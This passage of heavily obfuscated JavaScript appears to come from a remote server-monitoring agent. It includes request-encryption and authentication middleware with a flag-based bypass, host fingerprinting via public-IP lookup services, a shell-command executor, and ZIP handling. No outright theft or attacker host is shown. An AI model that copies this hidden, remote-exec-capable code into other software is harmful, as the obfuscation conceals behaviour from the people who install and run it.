    return async (d, f, g) => {
        const bE = bD;
        if (d['path'][bE(0x456)](c[bE(0x5c2)]))
            return c[bE(0x984)](g);
        const h = f[bE(0x2ae)];
        f[bE(0x2ae)] = function (n) {
            const bF = bE;
            if (a0P['DEBUG']) {
                const o = typeof n === 'string' ? n : Buffer[bF(0x25e)](n) ? n : JSON[bF(0x852)](n);
                return f[bF(0x336)]('x-encrypted', c['JEOVh']), f['set'](c[bF(0x387)], Buffer[bF(0x885)](o)[bF(0x248)]()), h[bF(0x900)](this, o);
            }
            if (f['get'](c[bF(0x800)]) && f[bF(0x47b)](c[bF(0x800)])['includes'](c['pRqUP']))
                try {
                    if (d[bF(0x35b)]) {
                        let p;
                        if (c[bF(0x81b)](d[bF(0x7eb)], c[bF(0x80c)])) {
                            const q = typeof n === c[bF(0x8d2)] ? JSON[bF(0x57a)](n) : n;
                            let r = null;
                            d[bF(0x657)] === c['OsrwI'] && b && (r = b['getActiveEciesPub']());
                            const s = a[bF(0x777)](q, r);
                            p = c[bF(0x81b)](typeof s, c[bF(0x8d2)]) ? s : JSON['stringify'](s);
                        } else {
                            const t = Buffer[bF(0x25e)](n) ? n : c[bF(0x81b)](typeof n, c['vilIq']) ? Buffer['from'](n, bF(0x610)) : Buffer[bF(0x4ed)](JSON[bF(0x852)](n), c[bF(0x39b)]);
                            p = a[bF(0x22a)](t, Buffer[bF(0x4ed)](a0P[bF(0x95f)], bF(0x2dd)));
                        }
                        return f[bF(0x336)](c['tUDvO'], c['XuBBC']), f[bF(0x336)](c[bF(0x6b4)], a0P['AGENT_VERSION']), f[bF(0x336)](c[bF(0x387)], Buffer[bF(0x885)](p, c[bF(0x39b)])[bF(0x248)]()), h[bF(0x900)](this, p);
                    } else {
                        const u = typeof n === bF(0x709) ? n : JSON[bF(0x852)](n);
                        return f[bF(0x336)](c['wZkeg'], Buffer['byteLength'](u, c[bF(0x39b)])[bF(0x248)]()), h[bF(0x900)](this, u);
                    }
                } catch (v) {
                    if (!f[bF(0x8e9)]) {
                        const w = JSON[bF(0x852)]({ 'error': bF(0x3a9) + v['message'] });
                        return f[bF(0x62d)](0x1f4), f[bF(0x336)](bF(0x91b), bF(0x8b1)), f[bF(0x336)](c[bF(0x387)], Buffer[bF(0x885)](w, bF(0x610))[bF(0x248)]()), h[bF(0x900)](this, w);
                    }
                    throw v;
                }
            return h[bF(0x900)](this, n);
        };
        const i = f[bE(0x53f)];
        f['end'] = function (...n) {
            const bG = bE;
            return a0P[bG(0x2bb)] && !f[bG(0x47b)](bG(0x73e)) && f[bG(0x336)](c[bG(0x7d0)], bG(0x906)), i[bG(0x464)](this, n);
        };
        if (c[bE(0x4ab)](d[bE(0x75b)], bE(0x3ce)) || c['NCHNp'](d[bE(0x75b)], c[bE(0x7e8)]))
            return a0P[bE(0x2bb)] && f[bE(0x336)](c[bE(0x7d0)], bE(0x906)), c['NKvSX'](g);
        d['is_authenticated'] = ![];
        const j = [
            c[bE(0x80c)],
            bE(0x86a)
        ];
        if (a0P[bE(0x2bb)])
            return d[bE(0x35b)] = !![], g();
        const k = d['headers'][bE(0x225)] || d[bE(0x695)][c[bE(0x285)]], l = d[bE(0x695)][c[bE(0x7e4)]] || d[bE(0x695)][c[bE(0x744)]], m = d[bE(0x695)][c[bE(0x683)]] || d[bE(0x695)][c[bE(0x21e)]];
        if (!k || !l || !m)
            return j[bE(0x94f)](d['path']) ? c[bE(0x27b)](g) : f[bE(0x62d)](0x191)[bE(0x881)]({ 'error': c[bE(0x66b)] });
        try {
            let n = Buffer[bE(0x21a)](0x0);
            if (d[bE(0x7eb)] !== c[bE(0x605)]) {
                if (Buffer['isBuffer'](d[bE(0x379)]))
                    n = d[bE(0x379)];
                else {
                    if (c[bE(0x81b)](typeof d[bE(0x379)], c[bE(0x8d2)]))
                        n = Buffer[bE(0x4ed)](d[bE(0x379)], c[bE(0x875)]);
                }
            }
            const o = c[bE(0x72d)](n[bE(0x7f5)], 0x0) ? a0k['createHash']('sha256')['update'](n)[bE(0x739)](c['aHCLW']) : '', p = b ? b[bE(0x4af)]() : null, q = a[bE(0x1fb)](d[bE(0x75b)], d[bE(0x7eb)], o, k, l, m, p);
            d[bE(0x35b)] = !![], d[bE(0x657)] = c[bE(0x81b)](q, c[bE(0x2be)]) ? c['OsrwI'] : 'static';
        } catch (r) {
            return j[bE(0x94f)](d[bE(0x7eb)]) ? g() : f[bE(0x62d)](0x191)[bE(0x881)]({ 'error': bE(0x35d) + r['message'] });
        }
        if (d[bE(0x379)] && c[bE(0x81b)](typeof d[bE(0x379)], c[bE(0x8d2)])) {
            const s = c[bE(0x4ab)]((d[bE(0x695)][c[bE(0x7f1)]] || '')[bE(0x216)](), c['XuBBC']);
            try {
                if (s && d[bE(0x35b)]) {
                    const t = Buffer[bE(0x4ed)](a0P['SESSION_KEY'], c['flqWp']), u = a[bE(0x330)](d[bE(0x379)], t);
                    d[bE(0x379)] = JSON[bE(0x57a)](u);
                } else {
                    if (d[bE(0x379)][bE(0x456)](c[bE(0x286)])) {
                        const v = Buffer[bE(0x4ed)](d[bE(0x379)], bE(0x2dd))[bE(0x248)](c[bE(0x875)]);
                        d[bE(0x379)] = JSON[bE(0x57a)](v);
                    } else {
                        if (d[bE(0x379)]['trim']()[bE(0x456)]('{') || d[bE(0x379)][bE(0x7b0)]()['startsWith']('['))
                            d[bE(0x379)] = JSON[bE(0x57a)](d[bE(0x379)]);
                        else {
                            if (c[bE(0x4ab)](d[bE(0x379)][bE(0x7b0)](), ''))
                                d[bE(0x379)] = {};
                        }
                    }
                }
            } catch (w) {
                return a0D[bE(0x993)](bE(0x39e) + w[bE(0x842)]), f['status'](0x190)[bE(0x881)]({ 'error': bE(0x8ae) + w[bE(0x842)] });
            }
        }
        g();
    };
}
class a0U {
    constructor() {
        const bH = a0aY, a = {
                'AhOpa': function (b, c) {
                    return b / c;
                }
            };
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bH(0x222)] = 0x0, this['totalNetworkDown'] = 0x0, this[bH(0x273)] = a[bH(0x901)](Date[bH(0x2a9)](), 0x3e8);
    }
    async [a0aY(0x856)]() {
        const bI = a0aY, a = {
                'rjViZ': '/sys/fs/cgroup/memory.max',
                'OkskS': function (d, f) {
                    return d === f;
                },
                'vAGIA': function (d, f, g) {
                    return d(f, g);
                },
                'EhqDo': function (d, f, g) {
                    return d(f, g);
                },
                'sExvC': bI(0x537),
                'aSoqU': bI(0x610),
                'RJVXU': function (d, f, g) {
                    return d(f, g);
                },
                'cBQpW': bI(0x831),
                'iweuI': function (d, f, g) {
                    return d(f, g);
                },
                'QagLd': bI(0x3a6),
                'knToM': function (d, f) {
                    return d > f;
                },
                'FkzVq': function (d, f) {
                    return d === f;
                },
                'uvFHX': function (d, f) {
                    return d(f);
                },
                'DJYhD': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bI(0x78c)](a[bI(0x511)], bI(0x610)))[bI(0x7b0)]();
            b = a[bI(0x8d4)](d, bI(0x253)) ? null : a[bI(0x59e)](parseInt, d, 0xa), c = a[bI(0x6f0)](parseInt, (await a0m[bI(0x78c)](a[bI(0x380)], a['aSoqU']))['trim'](), 0xa);
        } catch {
            try {
                b = a[bI(0x228)](parseInt, (await a0m[bI(0x78c)](a[bI(0x7a0)], a[bI(0x362)]))[bI(0x7b0)](), 0xa), c = a[bI(0x666)](parseInt, (await a0m['readFile'](a[bI(0x4db)], a['aSoqU']))[bI(0x7b0)](), 0xa);
                if (a[bI(0x71a)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u['mem']();
                b = f[bI(0x742)], c = f['used'];
            }
        }
        if (a[bI(0x2d9)](b, null)) {
            const g = await a0u[bI(0x873)]();
            b = g['total'], (c === null || a[bI(0x3e8)](isNaN, c)) && (c = g[bI(0x478)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bI(0x97a)](b, c),
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aY(0x789)]() {
        const bJ = a0aY, [a, b, c, d] = await Promise[bJ(0x48e)]([
                a0u[bJ(0x8a4)](),
                this[bJ(0x856)](),
                a0u[bJ(0x5e3)](),
                a0u['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[bJ(0x759)](),
                this[bJ(0x6cc)]()
            ]);
        } catch (h) {
            a0D[bJ(0x761)](bJ(0x357) + h[bJ(0x842)], 0x1);
        }
        return {
            'arch': a0p[bJ(0x6c5)](),
            'cpu_cores': a[bJ(0x752)],
            'cpu_name': a[bJ(0x2b3)],
            'disk_total': (await a0u[bJ(0x64a)]())[0x0]?.[bJ(0x5ca)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b['total'],
            'os': c['distro'] + '\x20' + c[bJ(0x40a)],
            'kernel_version': c[bJ(0x7c8)],
            'swap_total': b[bJ(0x5f7)],
            'version': a0P[bJ(0x701)],
            'virtualization': await this[bJ(0x58a)](),
            'session_key': a0P[bJ(0x95f)],
            'noise_key': a0P[bJ(0x952)]
        };
    }
    [a0aY(0x524)]() {
        const bK = a0aY, a = {
                'iFFnN': function (c, d) {
                    return c === d;
                },
                'GfPrF': bK(0x808)
            }, b = a0p[bK(0x601)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[bK(0x3e3)](d[bK(0x451)], a[bK(0x52e)]) || d[bK(0x451)] === 0x4;
                if (f && !d[bK(0x8d1)]) {
                    if (!/^10\./[bK(0x4ef)](d[bK(0x7c6)]) && !/^192\.168\./[bK(0x4ef)](d[bK(0x7c6)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[bK(0x4ef)](d[bK(0x7c6)]))
                        return d[bK(0x7c6)];
                }
            }
        }
        return null;
    }
    async [a0aY(0x759)]() {
        const bL = a0aY, a = {
                'tqiDw': bL(0x4c9),
                'QLOfp': 'https://icanhazip.com',
                'JumvO': bL(0x7a5),
                'GegLA': bL(0x8c0),
                'uvsRl': 'https://myexternalip.com/raw'
            }, b = [
                a[bL(0x29e)],
                a['QLOfp'],
                bL(0x719),
                a[bL(0x780)],
                a[bL(0x981)],
                'https://ipinfo.io/ip',
                a['uvsRl']
            ];
        for (const d of b) {
            try {
                const f = await this[bL(0x266)](d, 0x4);
                if (f && this[bL(0x5a9)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bL(0x524)]();
        if (c && this[bL(0x5a9)](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const bM = a0aY, a = {
                'EBgww': function (c, d) {
                    return c === d;
                },
                'OeDoq': bM(0x5b5)
            }, b = a0p[bM(0x601)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[bM(0x6fd)](d[bM(0x451)], 'IPv6') || d[bM(0x451)] === 0x6;
                if (f && !d[bM(0x8d1)]) {
                    if (!d[bM(0x7c6)][bM(0x216)]()[bM(0x456)](a[bM(0x595)]))
                        return d[bM(0x7c6)];
                }
            }
        }
        return null;
    }
    async [a0aY(0x6cc)]() {
        const bN = a0aY, a = {
                'jedrG': bN(0x6ea),
                'DUGAT': 'https://icanhazip.com',
                'BIhgq': bN(0x766)
            }, b = this[bN(0x66d)]();
        if (b && this[bN(0x427)](b))
            return b;
        const c = [
            a[bN(0x931)],
            a['DUGAT'],
            a[bN(0x5ea)]
        ];
        for (const d of c) {
            try {
                const f = await this[bN(0x266)](d, 0x6);
                if (f && this[bN(0x427)](f))
                    return f;
            } catch (g) {
                a0D[bN(0x761)](bN(0x806) + d + bN(0x25a) + g[bN(0x842)]);
                continue;
            }
        }
        return null;
    }
    async [a0aY(0x266)](a, b = 0x0) {
        const bO = a0aY, c = {
                'WdHzD': function (d, f) {
                    return d(f);
                },
                'drIMu': bO(0x37d),
                'eKuxM': function (d, f) {
                    return d(f);
                },
                'OhqcD': bO(0x6c7),
                'VeMRd': bO(0x993)
            };
        return new Promise((d, f) => {
            const bQ = bO, g = {
                    'YHppK': function (k, l) {
                        const bP = a0b;
                        return c[bP(0x2f7)](k, l);
                    },
                    'hSBaO': c[bQ(0x622)],
                    'TGFvL': bQ(0x3b2)
                }, h = c['eKuxM'](require, c[bQ(0x42e)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': bQ(0x2a5) }
                }, j = h[bQ(0x47b)](a, i, k => {
                    const bR = bQ;
                    let l = '';
                    if (k[bR(0x5cd)] !== 0xc8) {
                        g[bR(0x5d5)](f, new Error(bR(0x548) + k[bR(0x5cd)]));
                        return;
                    }
                    k['on'](g[bR(0x76b)], m => l += m), k['on'](bR(0x53f), () => d(l[bR(0x7b0)]()));
                });
            j['on'](c[bQ(0x4e9)], f), j['setTimeout'](0x1388, () => {
                const bS = bQ;
                j[bS(0x7f0)](), g[bS(0x5d5)](f, new Error(g[bS(0x23f)]));
            });
        });
    }
    [a0aY(0x5a9)](a) {
        const bT = a0aY;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bT(0x4ef)](a);
    }
    [a0aY(0x427)](a) {
        const bU = a0aY;
        if (!/^[0-9a-fA-F:]+$/[bU(0x4ef)](a) || !a[bU(0x94f)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bU(0x4ef)](a))
            return ![];
        return !![];
    }
    async ['getRealtimeInfo']() {
        const bV = a0aY, a = {
                'Cmger': function (m, n) {
                    return m - n;
                },
                'jNeen': function (m, n) {
                    return m / n;
                },
                'hxgZz': function (m, n) {
                    return m * n;
                },
                'HdTvA': function (m, n) {
                    return m * n;
                },
                'yiOdU': function (m, n) {
                    return m / n;
                },
                'PSWvL': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bV(0x48e)]([
                a0u[bV(0x978)](),
                a0u[bV(0x873)](),
                a0u['networkStats'](),
                a0u[bV(0x978)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = Date[bV(0x2a9)]() / 0x3e8, i = h - this[bV(0x273)], j = g[bV(0x7f4)] - this[bV(0x82b)]['tx'], k = a['Cmger'](g['rx_bytes'], this[bV(0x82b)]['rx']);
        this[bV(0x222)] += j, this['totalNetworkDown'] += k, this['lastNetworkStats'] = {
            'tx': g[bV(0x7f4)],
            'rx': g[bV(0x690)]
        }, this['lastNetworkTime'] = h;
        const l = await a0u[bV(0x7e3)]();
        return {
            'cpu': { 'usage': Math['round'](b['currentLoad']) },
            'ram': {
                'total': c[bV(0x742)],
                'used': c['active']
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c['swapused']
            },
            'load': {
                'load1': a[bV(0x891)](Math[bV(0x217)](a['hxgZz'](f[bV(0x255)], 0x64)), 0x64),
                'load5': Math[bV(0x217)](a['hxgZz'](f[bV(0x255)], 0x64)) / 0x64,
                'load15': a[bV(0x891)](Math['round'](a[bV(0x251)](f['avgLoad'], 0x64)), 0x64)
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[bV(0x217)](a[bV(0x77b)](j, i)),
                'down': Math[bV(0x217)](a['PSWvL'](k, i)),
                'totalUp': this[bV(0x222)],
                'totalDown': this['totalNetworkDown']
            },
            'connections': await this['_getConnections'](),
            'uptime': a0p[bV(0x568)](),
            'process': l?.['all'] || 0x0,
            'message': ''
        };
    }
    async [a0aY(0x58a)]() {
        const bW = a0aY, a = {
                'lmGWZ': bW(0x769),
                'CWaNi': bW(0x68e),
                'IbwJN': bW(0x2d8),
                'QveTR': bW(0x7c1),
                'qltol': bW(0x610),
                'MzfaW': bW(0x8dc),
                'eSZlq': bW(0x75a),
                'fSJAN': 'Kubernetes',
                'mWvFR': 'lxc',
                'PynME': bW(0x342),
                'hpNAC': '/proc/self/mountinfo',
                'yscSr': bW(0x579),
                'UPrhS': bW(0x36a),
                'YGrYw': '/pods/',
                'otQRJ': bW(0x326),
                'sLOnD': bW(0x7a1),
                'qrXxG': bW(0x283),
                'jBjfg': bW(0x5ee),
                'Tofwz': bW(0x5aa),
                'IXVlI': bW(0x1e7)
            };
        try {
            if (a0l[bW(0x871)](a[bW(0x229)]))
                return bW(0x8dc);
            if (a0l[bW(0x871)](a[bW(0x5bb)]))
                return a[bW(0x79c)];
            if (a0l['existsSync'](a['QveTR'])) {
                const b = a0l['readFileSync'](a[bW(0x877)], a[bW(0x55b)])[bW(0x216)]();
                if (b[bW(0x94f)](bW(0x7ed)) || b[bW(0x94f)](bW(0x5f9)))
                    return a[bW(0x48b)];
                else {
                    if (b[bW(0x94f)](a[bW(0x69a)]))
                        return a[bW(0x77a)];
                    else {
                        if (b[bW(0x94f)](a['mWvFR']))
                            return a[bW(0x7b1)];
                    }
                }
            }
            if (a0l[bW(0x871)](a[bW(0x552)])) {
                const c = a0l['readFileSync'](a[bW(0x552)], bW(0x610));
                if (c['includes'](a[bW(0x3b1)]) || c[bW(0x94f)](a[bW(0x2aa)]))
                    return a[bW(0x48b)];
                else {
                    if (c[bW(0x94f)](a[bW(0x96d)]) || c['includes'](a[bW(0x3f7)]))
                        return a[bW(0x77a)];
                }
            }
            if (a0l[bW(0x871)](bW(0x8aa))) {
                const d = a0l[bW(0x3f2)](bW(0x8aa), bW(0x610));
                if (d[bW(0x94f)](a[bW(0x3cf)]))
                    return a[bW(0x7b1)];
            }
            if (a0l[bW(0x871)](a[bW(0x305)])) {
                const f = a0l[bW(0x3f2)](a[bW(0x305)], a['qltol']);
                if (f[bW(0x94f)](a[bW(0x364)]) || f[bW(0x94f)](a[bW(0x43a)]))
                    return a['jBjfg'];
            }
        } catch (g) {
        }
        return a[bW(0x5b2)];
    }
    async ['_getDiskInfo']() {
        const bX = a0aY, a = {
                'bsncM': function (b, c) {
                    return b !== c;
                },
                'JYzBR': 'tmpfs',
                'CAHiU': function (b, c) {
                    return b !== c;
                },
                'wsPkl': 'overlay',
                'tJgju': bX(0x1f3)
            };
        try {
            const b = await a0u[bX(0x64a)](), c = b[bX(0x4b3)](g => {
                    const bY = bX;
                    return g[bY(0x5ca)] > 0x0 && a[bY(0x4c1)](g[bY(0x7e0)], a[bY(0x833)]) && a['CAHiU'](g[bY(0x7e0)], a[bY(0x260)]) && g['fs']['startsWith'](a[bY(0x337)]);
                }), d = c['reduce']((g, h) => g + h[bX(0x5ca)], 0x0), f = c[bX(0x924)]((g, h) => g + h[bX(0x478)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aY(0x7d6)]() {
        const bZ = a0aY;
        try {
            const a = await a0u[bZ(0x87c)](), b = a[bZ(0x4b3)](d => d[bZ(0x5cf)] === bZ(0x503))[bZ(0x7f5)], c = a[bZ(0x4b3)](d => d[bZ(0x5cf)] === bZ(0x604))[bZ(0x7f5)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async [a0aY(0x35a)](a, b = {}) {
        const c0 = a0aY, c = {
                'yDABW': function (d, f) {
                    return d - f;
                },
                'pbgEF': function (d, f) {
                    return d === f;
                },
                'wNyRC': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'TeZFG': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[c0(0x376)](),
                env: env = {},
                timeout: timeout = a0P[c0(0x6e2)]
            } = b;
        return new Promise(d => {
            const c3 = c0, f = {
                    'pgkQb': function (i, j) {
                        const c1 = a0b;
                        return c[c1(0x7f9)](i, j);
                    },
                    'zcvWg': function (i, j) {
                        const c2 = a0b;
                        return c[c2(0x58b)](i, j);
                    },
                    'HwPMx': c3(0x51a)
                }, g = Date['now'](), h = c[c3(0x6fb)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[c3(0x91e)](timeout, 0x3e8),
                    'maxBuffer': c[c3(0x91e)](c[c3(0x91e)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const c4 = c3, l = f[c4(0x89e)](Date[c4(0x2a9)](), g), m = i && i[c4(0x811)] && i['signal'];
                    let n = j || '';
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[c4(0x31d)](typeof i['code'], f['HwPMx']) ? o = i[c4(0x557)] : o = -0x1;
                    }
                    d({
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const c5 = a0aY, b = {
            'ReFgS': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l['realpathSync'][c5(0x4e7)](a0o['resolve'](a0P[c5(0x882)])), d = a0o['resolve'](a);
        let f = d;
        while (!a0l[c5(0x871)](f)) {
            const j = a0o[c5(0x312)](f);
            if (b[c5(0x6bf)](j, f))
                return ![];
            f = j;
        }
        const g = a0l[c5(0x585)]['native'](f), h = a0o[c5(0x7e6)](c, g);
        if (h['startsWith']('..') || a0o[c5(0x41a)](h))
            return ![];
        const i = a0o[c5(0x7e6)](f, d);
        if (i && (i[c5(0x456)]('..') || a0o[c5(0x41a)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0X {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
    static [a0aY(0x346)] = 0x200 * 0x400 * 0x400;
    static [a0aY(0x30a)] = 0x1f4;
    static [a0aY(0x459)] = null;
    static [a0aY(0x3ae)](a) {
        const c6 = a0aY, b = {
                'wSNSj': function (g, h) {
                    return g < h;
                },
                'leLhA': function (g, h) {
                    return g & h;
                },
                'JheXV': function (g, h) {
                    return g ^ h;
                },
                'FMFpf': function (g, h) {
                    return g >>> h;
                },
                'jdLYH': function (g, h) {
                    return g < h;
                }
            };
        if (!a0X[c6(0x459)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; b[c6(0x505)](h, 0x100); h++) {
                let j = h;
                for (let l = 0x0; b[c6(0x505)](l, 0x8); l++)
                    j = b[c6(0x313)](j, 0x1) ? b['JheXV'](0xedb88320, b[c6(0x6ad)](j, 0x1)) : b[c6(0x6ad)](j, 0x1);
                g[h] = j;
            }
            a0X['_crcTable'] = g;
        }
        const d = a0X[c6(0x459)];
        let f = -0x1;
        for (let m = 0x0; b[c6(0x395)](m, a[c6(0x7f5)]); m++)
            f = b[c6(0x602)](f >>> 0x8, d[b[c6(0x313)](b[c6(0x602)](f, a[m]), 0xff)]);
        return (f ^ -0x1) >>> 0x0;
    }
    static [a0aY(0x547)](a) {
        const c7 = a0aY, b = {
                'SDKbw': function (g, h) {
                    return g & h;
                },
                'gwYlX': function (g, h) {
                    return g | h;
                },
                'wINRQ': function (g, h) {
                    return g << h;
                },
                'naOOL': function (g, h) {
                    return g >> h;
                },
                'WpQjf': function (g, h) {
                    return g << h;
                },
                'qdDZF': function (g, h) {
                    return g - h;
                },
                'DbeMV': function (g, h) {
                    return g << h;
                }
            }, c = b[c7(0x905)](b['gwYlX'](b[c7(0x664)](a[c7(0x7e7)](), 0xb), b[c7(0x664)](a[c7(0x49c)](), 0x5)) | b[c7(0x53a)](a[c7(0x3fe)](), 0x1), 0xffff), f = (b['WpQjf'](b['qdDZF'](a[c7(0x40d)](), 0x7bc), 0x9) | b[c7(0x767)](a[c7(0x36b)]() + 0x1, 0x5) | a[c7(0x8e7)]()) & 0xffff;
        return {
            'time': c,
            'date': f
        };
    }
    static [a0aY(0x69c)](a) {
        const c8 = a0aY, b = {
                'ypVyI': function (i, j) {
                    return i - j;
                },
                'VjluG': function (i, j) {
                    return i >= j;
                },
                'XhGWF': c8(0x610),
                'IoxOC': function (i, j) {
                    return i > j;
                },
                'eQXHn': function (i, j) {
                    return i < j;
                },
                'QLTBO': function (i, j) {
                    return i(j);
                },
                'qpKJE': function (i, j) {
                    return i + j;
                },
                'LrxOx': function (i, j) {
                    return i + j;
                },
                'zBbEf': function (i, j) {
                    return i(j);
                },
                'OMlwZ': function (i, j) {
                    return i(j);
                }
            }, c = a0l[c8(0x81e)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const c9 = c8;
            let j = 0x0;
            while (j < i[c9(0x7f5)])
                j += a0l[c9(0x737)](c, i, j, b[c9(0x82e)](i['length'], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const ca = c8;
                if (b[ca(0x469)](g, a0X[ca(0x722)]))
                    return ![];
                const m = Buffer[ca(0x4ed)](i, b[ca(0x32e)]);
                j = j || Buffer[ca(0x21a)](0x0);
                const n = l ? 0x0 : a0X[ca(0x3ae)](j);
                let o = 0x0, p = j;
                if (!l && b[ca(0x360)](j[ca(0x7f5)], 0x0)) {
                    const u = a0n[ca(0x27f)](j, { 'level': 0x6 });
                    b[ca(0x21b)](u['length'], j['length']) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0X['_dosDateTime'](k || new Date()), s = Buffer[ca(0x21a)](0x1e);
                s[ca(0x4bb)](0x4034b50, 0x0), s[ca(0x656)](0x14, 0x4), s[ca(0x656)](0x800, 0x6), s[ca(0x656)](o, 0x8), s[ca(0x656)](q, 0xa), s[ca(0x656)](r, 0xc), s[ca(0x4bb)](n, 0xe), s[ca(0x4bb)](p[ca(0x7f5)], 0x12), s[ca(0x4bb)](j[ca(0x7f5)], 0x16), s[ca(0x656)](m['length'], 0x1a), s[ca(0x656)](0x0, 0x1c), h(s), b['QLTBO'](h, m), b['QLTBO'](h, p);
                const t = Buffer['alloc'](0x2e);
                return t['writeUInt32LE'](0x2014b50, 0x0), t[ca(0x656)](0x14, 0x4), t[ca(0x656)](0x14, 0x6), t[ca(0x656)](0x800, 0x8), t[ca(0x656)](o, 0xa), t[ca(0x656)](q, 0xc), t[ca(0x656)](r, 0xe), t[ca(0x4bb)](n, 0x10), t[ca(0x4bb)](p['length'], 0x14), t[ca(0x4bb)](j[ca(0x7f5)], 0x18), t[ca(0x656)](m[ca(0x7f5)], 0x1c), t['writeUInt16LE'](0x0, 0x1e), t['writeUInt16LE'](0x0, 0x20), t[ca(0x656)](0x0, 0x22), t['writeUInt16LE'](0x0, 0x24), t[ca(0x4bb)](l ? 0x10 : 0x0, 0x26), t[ca(0x4bb)](f, 0x2a), d['push'](t, m), f += b[ca(0x2eb)](b[ca(0x39f)](0x1e, m[ca(0x7f5)]), p['length']), g++, !![];
            },
            'close'() {
                const cb = c8, i = Buffer[cb(0x8ed)](d), j = Buffer[cb(0x21a)](0x16);
                return j['writeUInt32LE'](0x6054b50, 0x0), j[cb(0x656)](0x0, 0x4), j[cb(0x656)](0x0, 0x6), j[cb(0x656)](g, 0x8), j['writeUInt16LE'](g, 0xa), j[cb(0x4bb)](i[cb(0x7f5)], 0xc), j[cb(0x4bb)](f, 0x10), j[cb(0x656)](0x0, 0x14), b['zBbEf'](h, i), b['OMlwZ'](h, j), a0l[cb(0x480)](c), g;
            }
        };
    }
    static [a0aY(0x57a)](a) {
        const cc = a0aY, b = {
                'WzWJA': function (n, o) {
                    return n + o;
                },
                'JUPQV': function (n, o) {
                    return n - o;
                },
                'uygty': function (n, o) {
                    return n === o;
                },
                'aIShK': function (n, o) {
                    return n < o;
                },
                'VsBAw': function (n, o) {
                    return n + o;
                },
                'XAYxK': function (n, o) {
                    return n + o;
                },
                'MMhkE': function (n, o) {
                    return n <= o;
                },
                'WCwaP': function (n, o) {
                    return n !== o;
                },
                'BXiWi': function (n, o) {
                    return n + o;
                },
                'fjSLL': function (n, o) {
                    return n + o;
                },
                'YJhca': function (n, o) {
                    return n + o;
                },
                'jybyA': function (n, o) {
                    return n + o;
                },
                'FttzO': function (n, o) {
                    return n + o;
                },
                'jsglN': cc(0x610),
                'YGqGJ': function (n, o) {
                    return n + o;
                },
                'srkAo': function (n, o) {
                    return n !== o;
                },
                'kBPYP': function (n, o) {
                    return n & o;
                },
                'mHUrJ': function (n, o) {
                    return n !== o;
                },
                'vUTql': function (n, o) {
                    return n & o;
                },
                'hlpEF': function (n, o) {
                    return n + o;
                },
                'TRysi': function (n, o) {
                    return n <= o;
                }
            }, c = a0l[cc(0x3f2)](a);
        let d = -0x1;
        const f = Math[cc(0x253)](0x0, c[cc(0x7f5)] - b[cc(0x304)](0xffff, 0x16));
        for (let n = b[cc(0x74e)](c[cc(0x7f5)], 0x16); n >= f; n--) {
            if (b[cc(0x3e9)](c[cc(0x61e)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[cc(0x581)](d, 0x0))
            throw new Error(cc(0x78a));
        const g = c[cc(0x658)](b[cc(0x304)](d, 0xa)), h = c[cc(0x61e)](b[cc(0x6b7)](d, 0xc)), j = c['readUInt32LE'](b[cc(0x44f)](d, 0x10)), k = [];
        let l = j;
        const m = b[cc(0x44f)](j, h);
        for (let o = 0x0; o < g && b[cc(0x85c)](l + 0x2e, m); o++) {
            if (b['WCwaP'](c['readUInt32LE'](l), 0x2014b50))
                break;
            const q = c[cc(0x658)](b[cc(0x532)](l, 0x8)), r = c[cc(0x658)](b[cc(0x6b7)](l, 0xa)), s = c[cc(0x61e)](b[cc(0x532)](l, 0x10)), t = c[cc(0x61e)](b[cc(0x304)](l, 0x14)), u = c[cc(0x61e)](b[cc(0x48c)](l, 0x18)), v = c['readUInt16LE'](l + 0x1c), w = c[cc(0x658)](b[cc(0x7da)](l, 0x1e)), x = c[cc(0x658)](b['jybyA'](l, 0x20)), y = c[cc(0x61e)](b[cc(0x532)](l, 0x26)), z = c['readUInt32LE'](b['FttzO'](l, 0x2a)), A = c[cc(0x710)](l + 0x2e, l + 0x2e + v)[cc(0x248)](b['jsglN']);
